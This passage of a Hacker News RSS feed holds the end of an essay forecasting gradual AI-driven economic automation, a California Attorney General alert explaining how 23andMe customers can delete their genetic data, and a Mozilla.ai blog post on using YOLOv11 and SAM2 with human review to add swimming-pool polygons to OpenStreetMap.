  <li>As a consequence, AIs will be deployed broadly across the economy to automate an increasingly wide spectrum of labor tasks. Eventually, this will culminate in greatly accelerated economic growth.</li>
  <li>Prior to the point at which AIs precipitate <em>transformative</em> effects on the world—in the sense of explosive economic, medical, or other technological progress—there will have <em>already been</em> a series of highly disruptive waves of automation that fundamentally reshaped global labor markets and public perceptions of AI.</li>
  <li>At every moment in time, including after the point at which AI can meaningfully accelerate economic, medical, or technological progress, the primary channel through which AI will accelerate each of these variables will be the widespread automation of non-R&amp;D tasks at scale.</li>
</ol>

<p>One might call this picture the “general automation explosion”, to emphasize that the key force supporting acceleration is the breadth and scale of AI automation, rather than from any specific thing AI is good at. However, we admit this term isn’t as catchy as the phrase “intelligence explosion”.</p>

<h2 id="key-takeaways">Key takeaways</h2>

<p>This view has important implications for how we should approach the future of AI from a business, policy, and personal perspective.</p>

<p>First, from a business perspective, we suspect that for the foreseeable future, it will be more profitable for AI labs to focus on trying to automate ordinary work tasks—such as creating computer-use agents that can competently browse the internet, operate commercial software, and perform standard white collar job tasks—rather than focusing on developing “Nobel Laureate”-level reasoning models that are capable of narrowly assisting researchers in fields like biology and medicine. We also believe these ordinary abilities will likely be more important to track and benchmark compared to AI performance on R&amp;D tasks.</p>

<p>Second, from a policy perspective, we think it’s important to recognize that public opinion on AI will likely undergo a profound shift between now and when AI will start to have transformative effects on the world—such as explosive economic growth or substantial progress in human life extension. This shift will occur because, by the time AI reaches that stage, society will have already experienced a series of disruptive waves of automation that displaced workers on a large scale. Consequently, we think it’s wrong to assume that public opinion on AI will remain roughly the same as it is right now until right before, or after, transformative AI.</p>

<p>Third, from a personal perspective, we think it’s worth planning for and investing in a future where AIs will take over jobs incrementally over several years or even decades—rather than anticipating a future where human labor becomes obsolete <em>all at once</em> right after AI takes over the AI R&amp;D process. We think that rather than imagining a relatively sudden event when AI explodes into superintelligence through recursive AI R&amp;D, it’s more productive to anticipate a smoother transition to full automation of the economy.</p>

<p>In our view, there will likely be an extended period during which AIs surpass humans in some tasks but remain inferior to humans in other complementary tasks. To be clear, we agree that AIs will eventually outperform humans at nearly all economically valuable activities, and this will lead to a significant acceleration in economic growth. However, we believe this will likely only occur after several years or decades of increasingly widespread and disruptive automation—reaching far beyond just the R&amp;D sector.</p>


          
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[California AG Rob Bonta Urgently Issues Consumer Alert for 23andMe Customers (428 pts)]]></title>
            <link>https://oag.ca.gov/news/press-releases/attorney-general-bonta-urgently-issues-consumer-alert-23andme-customers</link>
            <guid>43447421</guid>
            <pubDate>Sat, 22 Mar 2025 17:55:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://oag.ca.gov/news/press-releases/attorney-general-bonta-urgently-issues-consumer-alert-23andme-customers">https://oag.ca.gov/news/press-releases/attorney-general-bonta-urgently-issues-consumer-alert-23andme-customers</a>, See on <a href="https://news.ycombinator.com/item?id=43447421">Hacker News</a></p>
<div id="readability-page-1" class="page"><div property="content:encoded"><p><em>Californians have the right to direct the company to delete their genetic data</em>&nbsp;</p>
<p><b>OAKLAND</b>&nbsp;— California Attorney General Rob Bonta today issued a consumer alert to customers of 23andMe, a genetic testing and information company. The California-based company has publicly reported that it is in financial distress and&nbsp;stated in securities filings that there is substantial doubt about its ability to continue as a going concern.&nbsp;Due to the trove of sensitive consumer data 23andMe has amassed, Attorney General Bonta reminds Californians of their right to&nbsp;direct&nbsp;the deletion of their genetic data under the Genetic Information Privacy Act (GIPA) and California Consumer Protection Act (CCPA).&nbsp;Californians who want to invoke these rights can do so by going to 23andMe's website.&nbsp;</p>
<p>“California has robust privacy laws that allow consumers to take control and request that a company delete their genetic data,”&nbsp;<b>said Attorney General Bonta.</b>&nbsp;“Given 23andMe’s reported financial distress, I remind&nbsp;Californians to consider invoking their rights and directing 23andMe to delete their data and destroy any samples of genetic material held by the company.”&nbsp;</p>
<p><b>To Delete Genetic Data from 23andMe:</b></p>
<ol>
<li>Consumers can delete their account and personal information by taking the following steps:</li>
<li>Log into your 23andMe account on their website.&nbsp;</li>
<li>Go to the “Settings” section of your profile.</li>
<li>Scroll to a section labeled “23andMe Data” at the bottom of the page.&nbsp;</li>
<li>Click “View” next to “23andMe Data”</li>
<li>Download your data: If you want a copy of your genetic data for personal storage, choose the option to download it to your device before proceeding.</li>
<li>Scroll to the “Delete Data” section.&nbsp;</li>
<li>Click “Permanently Delete Data.”&nbsp;</li>
<li>Confirm your request:&nbsp;You’ll receive an email from 23andMe; follow the link in the email to confirm your deletion request.</li>
</ol>
<p><b>To Destroy Your 23andMe Test Sample:</b></p>
<p>If you previously opted to have your saliva sample and DNA stored by 23andMe, but want to change that preference, you can do so from your account settings page, under “Preferences.”</p>
<p><b>To Revoke Permission for Your Genetic Data to be Used for Research:</b></p>
<p>If you previously consented to 23andMe and third-party researchers to use your genetic data and sample for research, you may withdraw consent from the account settings page, under “Research and Product Consents.”</p>
<p>Under GIPA, California consumers can delete their account and genetic data and have their biological sample destroyed.&nbsp;In addition, GIPA permits California consumers to revoke consent that they provided a genetic testing company to collect, use, and disclose genetic data and to store biological samples after the initial testing has been completed.&nbsp;The CCPA also vests California consumers with the right to delete personal information, which includes genetic data, from businesses that collect personal information from the consumer. &nbsp;&nbsp;</p>
<p>To learn more about the CCPA, please visit&nbsp;<a href="https://oag.ca.gov/privacy/ccpa">here</a>.&nbsp;&nbsp;</p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Map Features in OpenStreetMap with Computer Vision (269 pts)]]></title>
            <link>https://blog.mozilla.ai/map-features-in-openstreetmap-with-computer-vision/</link>
            <guid>43447335</guid>
            <pubDate>Sat, 22 Mar 2025 17:42:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.mozilla.ai/map-features-in-openstreetmap-with-computer-vision/">https://blog.mozilla.ai/map-features-in-openstreetmap-with-computer-vision/</a>, See on <a href="https://news.ycombinator.com/item?id=43447335">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
            <h3 id="motivation">Motivation</h3><p>At Mozilla.ai, we believe that there are a lot of opportunities where artificial intelligence (AI) can empower communities driven by open collaboration.&nbsp;</p><p>These opportunities need to be designed carefully, though, as many members of these communities (and people in general) are increasingly worried about the amount of <a href="https://en.wikipedia.org/wiki/AI_slop?ref=blog.mozilla.ai"><u>AI slop</u></a> flooding the internet.</p><p>With this idea in mind we developed and released the <a href="https://github.com/mozilla-ai/osm-ai-helper?ref=blog.mozilla.ai"><u>OpenStreetMap AI Helper</u></a> Blueprint. If you love maps and are interested in training your own computer vision model, you’ll enjoy diving into this Blueprint.</p><h3 id="why-openstreetmap">Why OpenStreetMap?</h3><p>Data is one of the most important components of any AI application, and <a href="https://www.openstreetmap.org/?ref=blog.mozilla.ai"><u>OpenStreetMap</u></a> has a vibrant community that collaborates to maintain and extend the most complete open map database available. </p><p>If you haven’t heard of it, <a href="https://www.openstreetmap.org/?ref=blog.mozilla.ai"><u>OpenStreetMap</u></a> is an open, editable map of the world created by a community of mappers who contribute and maintain data about roads, trails, cafés, railway stations, and more.</p><p>Combined with other sources, like satellite imagery, this database offers infinite possibilities to train different AI models.</p><figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXeQ5_VUhyWiLkZAqDkmqKu7p3vT5hC873l9vFSbduVam2uC3odROrGsOWLUdbYi9ZHAyWLHR-QT2SoowtHgqxcR_aaaJu6joEG6cNMhxdV2IiAvAToa_TQkic9Qx8sgkFxzTPBZ?key=ZPV5MptphH1GvdigS7RavJFc" alt="" loading="lazy" width="624" height="351"></figure><p>As a long-time user and contributor to <a href="https://www.openstreetmap.org/?ref=blog.mozilla.ai"><u>OpenStreetMap</u></a> , I wanted to build an end-to-end application where a model is first trained with this data and then used to contribute back.</p><p>The idea is to use AI to speed up the slower parts of the mapping process (roaming around the map, drawing polygons) while keeping a human in the loop for the critical parts (verifying that the generated data is correct).</p><h3 id="why-computer-vision">Why Computer Vision?</h3><p>Large Language Models (LLM) and, more recently, Visual Language Models (VLM) are sucking all the oxygen out of the AI room, but there are a lot of interesting applications that don’t (need to) use this type of models.</p><p>Many of the <a href="https://wiki.openstreetmap.org/wiki/Map_features?ref=blog.mozilla.ai"><u>Map Features</u></a> you can find in OpenStreetMap are represented with a polygon ('Area'). It turns out that finding and drawing these polygons is a very time consuming task for a human, but Computer Vision models can be easily trained for the task (when provided with enough data).</p><p>We chose to split the work of finding and drawing map features into 2 computer vision tasks using state-of-the-art non-LLM models: </p><ul><li><strong>Object Detection</strong> with <a href="https://docs.ultralytics.com/es/models/yolo11/?ref=blog.mozilla.ai"><u>YOLOv11</u></a>, by <a href="https://www.ultralytics.com/?ref=blog.mozilla.ai" rel="noreferrer">Ultralytics</a>, which identifies where relevant features exist in an image.</li><li><strong>Segmentation </strong>with <a href="https://ai.meta.com/sam2/?ref=blog.mozilla.ai"><u>SAM2</u></a>, by <a href="https://ai.meta.com/?ref=blog.mozilla.ai" rel="noreferrer">Meta</a>, which refines the detected features by outlining their exact shape.</li></ul><p>These models are lightweight, fast, and local-friendly – it’s refreshing to work with models that don’t demand a high-end GPU just to function. As an example, the combined weights of YOLOv11 and SAM2 take much less disk space (&lt;250MB) than any of the smallest Visual Language Models available, like <a href="https://huggingface.co/HuggingFaceTB/SmolVLM-Base?ref=blog.mozilla.ai"><u>SmolVLM </u></a>(4.5GB).</p><p>By combining these models, we can automate much of the mapping process while keeping humans in control for final verification.</p><h3 id="the-openstreetmap-ai-helper-blueprint">The OpenStreetMap AI Helper Blueprint</h3><p>The Blueprint can be divided into 3 stages:</p><figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXeAMhkrtYiDH7ZMsybzM7GF1KSiJMUTddPlc-xyfzlVdW6Mkd1xrtEFK81P_27vNHCMCnHGpEwEQN5-wIrkGKax_JpiBrClnzi1hVzMrrVvfpHk3fwd1fu_uiHmxxrpGiZcnKsqBA?key=ZPV5MptphH1GvdigS7RavJFc" alt="" loading="lazy" width="624" height="160"></figure><p><strong>Stage 1: Create an Object Detection dataset from OpenStreetMap</strong></p><p>The first stage involves fetching data from OpenStreetMap, combining it with satellite images, and transforming it into a format suitable for training.</p><p>You can run it yourself in the <a href="https://colab.research.google.com/github/mozilla-ai/osm-ai-helper/blob/main/demo/create_dataset.ipynb?ref=blog.mozilla.ai"><u>Create Dataset Colab</u></a>.</p><p>For fetching OpenStreetMap data, we use:</p><ul><li>The <a href="https://nominatim.org/?ref=blog.mozilla.ai"><u>Nominatim API</u></a> to provide users with a flexible way of selecting an area of interest. In our swimming pool example, we use <a href="https://nominatim.openstreetmap.org/ui/details.html?osmtype=R&amp;osmid=349036&amp;class=boundary&amp;ref=blog.mozilla.ai"><u>Galicia</u></a> for training and <a href="https://nominatim.openstreetmap.org/ui/details.html?osmtype=R&amp;osmid=3808752&amp;class=boundary&amp;ref=blog.mozilla.ai"><u>Viana do Castelo</u></a> for validation.</li><li>The <a href="https://wiki.openstreetmap.org/wiki/Overpass_API?ref=blog.mozilla.ai"><u>Overpass API</u></a> to download all the relevant polygons using specific <a href="https://wiki.openstreetmap.org/wiki/Tags?ref=blog.mozilla.ai"><u>tags</u></a> within the selected area of interest. In our swimming pool example, we use <a href="https://wiki.openstreetmap.org/wiki/Tag:leisure=swimming_pool?ref=blog.mozilla.ai"><u>leisure=swimming_pool</u></a> discarding the ones also tagged with <a href="https://wiki.openstreetmap.org/wiki/Tag:location%3Dindoor?ref=blog.mozilla.ai"><u>location=indoor</u></a>.</li></ul><p>Once all the polygons have been downloaded, you can choose a <a href="https://docs.mapbox.com/help/glossary/zoom-level/?ref=blog.mozilla.ai"><u>zoom level</u></a>. We use this zoom level to first identify all the tiles that contain a polygon and then download them using the <a href="https://docs.mapbox.com/api/maps/static-tiles/?ref=blog.mozilla.ai"><u>Static Tiles API</u></a> from <a href="https://www.mapbox.com/?ref=blog.mozilla.ai"><u>Mapbox</u></a>.</p><p>The polygons in latitude and longitude coordinates are transformed to a bounding box in pixel coordinates relative to each tile and then saved in the <a href="https://docs.ultralytics.com/datasets/detect/?ref=blog.mozilla.ai#ultralytics-yolo-format"><u>Ultralytics YOLO format</u></a>.</p><p>Finally, the dataset is uploaded to the <a href="https://huggingface.co/docs/hub/datasets?ref=blog.mozilla.ai"><u>Hugging Face Hub</u></a>. You can check our example <a href="https://huggingface.co/datasets/mozilla-ai/osm-swimming-pools?ref=blog.mozilla.ai"><u>mozilla-ai/osm-swimming-pools</u></a>.</p><p><strong>Stage 2 - Finetune an Object Detection model</strong></p><p>Once the dataset is uploaded in the right format, finetuning a <a href="https://docs.ultralytics.com/models/yolo11/?ref=blog.mozilla.ai"><u>YOLOv11</u></a> (or any other model supported by Ultralytics) is quite easy. </p><p>You can run it yourself in the <a href="https://colab.research.google.com/github/mozilla-ai/osm-ai-helper/blob/main/demo/finetune_model.ipynb?ref=blog.mozilla.ai"><u>Finetune Model Colab</u></a> and check all the <a href="https://docs.ultralytics.com/modes/train/?ref=blog.mozilla.ai#augmentation-settings-and-hyperparameters"><u>available hyperparameters</u></a>.</p><p>Once the model is trained, it is also uploaded to the <a href="https://huggingface.co/docs/hub/datasets?ref=blog.mozilla.ai"><u>Hugging Face Hub</u></a>. You can check our example <a href="https://huggingface.co/mozilla-ai/swimming-pool-detector?ref=blog.mozilla.ai"><u>mozilla-ai/swimming-pool-detector</u></a>.</p><p><strong>Stage 3 - Contributing to OpenStreetMap</strong></p><p>Once you have a finetuned Object Detection model, you can use it to run inference across multiple tiles. </p><p>You can run inference yourself in the <a href="https://colab.research.google.com/github/mozilla-ai/osm-ai-helper/blob/main/demo/run_inference.ipynb?ref=blog.mozilla.ai"><u>Run Inference Colab</u></a>. </p><p>We also provide a hosted demo where you can try our example swimming pool detector: <a href="https://huggingface.co/spaces/mozilla-ai/osm-ai-helper?ref=blog.mozilla.ai"><u>HuggingFace Demo</u></a>.</p><p>The inference requires a couple of human interactions. First, you need to first pick a point of interest in the map:</p><figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXczl1Ib_aQv-G0IUYx7lKv4s1eTCGt1AKHI8G_d9IpbUKtRfV--HyjkxVYT-AdiZ5e-5VeF-TuhRotvvsMOx4SWVFDDaoZtPPxuoYHStzl-a1aWrIn_hy8WpxBbx97sQtEvMEaniw?key=ZPV5MptphH1GvdigS7RavJFc" alt="" loading="lazy" width="624" height="315"></figure><p>After a point is selected, a bounding box is computed around it based on the <em>margin </em>argument.</p><p>All the existing elements of interest are downloaded from <a href="https://www.openstreetmap.org/?ref=blog.mozilla.ai"><u>OpenStreetMap</u></a>, and all the tiles are downloaded from <a href="https://www.mapbox.com/?ref=blog.mozilla.ai"><u>Mapbox</u></a> and joined to create a stacked image.</p><figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXeP6u-8eEa5cfLIZurqx4zcct2TeWMMFD999MfRNC0F4uQ7kaqBZPmdeUdQrVwB1fiS4MBPlpL86Vljev1WlvxtZhXGB5qy9d1Ghbh9lKlim3UsDyZTkANaU2TLwgx13URfCJRJnQ?key=ZPV5MptphH1GvdigS7RavJFc" alt="" loading="lazy" width="599" height="601"></figure><p>The stacked image is divided into overlapping tiles. For each tile, we run the Object Detection model (<a href="https://docs.ultralytics.com/models/yolo11/?ref=blog.mozilla.ai">YOLOv11</a>). If an object of interest is detected (e.g. a swimming pool), we pass the bounding box to the Segmentation model (<a href="https://github.com/facebookresearch/sam2?ref=blog.mozilla.ai"><u>SAM2</u></a>) to obtain a segmentation mask.</p><figure><img src="https://blog.mozilla.ai/content/images/2025/02/image.png" alt="" loading="lazy" width="1106" height="590" srcset="https://blog.mozilla.ai/content/images/size/w600/2025/02/image.png 600w, https://blog.mozilla.ai/content/images/size/w1000/2025/02/image.png 1000w, https://blog.mozilla.ai/content/images/2025/02/image.png 1106w" sizes="(min-width: 720px) 720px"></figure><p>All the predicted polygons are checked against the existing ones, downloaded from OpenStreetMap, in order to avoid duplicates.&nbsp;All those identified as <em>new </em>are displayed one by one for manual verification and filtering.</p><figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXfwAlhR0KxRyrjR8RPsYBbhdhYQn6udmJi_QeeAelz52YHK_K5UNLIbvI7RsAG1tsgzb0HKGB1MTezBjOlZRtfdpAfhIY1UMOlAmM_GxPSyQeYcn1J_cB9FdMLlu9-mUG7k13FAiQ?key=ZPV5MptphH1GvdigS7RavJFc" alt="" loading="lazy" width="624" height="301"></figure><p>The ones you chose to keep will be then uploaded to OpenStreetMap in a single <a href="https://wiki.openstreetmap.org/wiki/Changeset?ref=blog.mozilla.ai"><u>changeset</u></a><u>.</u></p><figure><img src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXewc5Qru4SyT3SBDxHV7EDGZ8XEjwV7P4uFAIhY-zkIafmJ_GP8yBeul4yNb9qAVOVfsIgFrfs7oaLq2Tb0HKuF_oWWXcx75likKPmGkyUF_uc9hCDhsgLXOC4OthbZZVGSZAcf?key=ZPV5MptphH1GvdigS7RavJFc" alt="" loading="lazy" width="624" height="293"></figure><h3 id="closing-thoughts">Closing thoughts</h3><p>OpenStreetMap is a powerful example of open collaboration to create a rich, community-driven map of the world. </p><p>The OpenStreatMap AI Helper Blueprint shows that, with the right approach, AI can enhance human contributions while keeping human verification at the core.&nbsp;In the fully manual process it takes about 1 min to map 2-3 swimming pools, whereas using the blueprint, even without an optimized UX, I can map about 10-15 in the same time (~5x more).</p><p>It also highlights the value of high-quality data from projects like OpenStreetMap, which enables to easily train models like YOLOv11 to perform object detection – proving that you shouldn’t always throw an LLM at the problem.</p><p>We’d love for you to try the <a href="https://github.com/mozilla-ai/osm-ai-helper?ref=blog.mozilla.ai"><u>OpenStreetMap AI Helper Blueprint</u></a> and experiment with training a model on a different map feature. If you’re interested, feel free to contribute to the repo to help improve it, or fork it to extend it even further!</p><p>To find other Blueprints we’ve released, check out the <a href="https://developer-hub.mozilla.ai/blueprints?ref=blog.mozilla.ai" rel="noopener noreferrer">Blueprints Hub</a>.</p>
        </section></div>]]></description>
        </item>
    </channel>
</rss>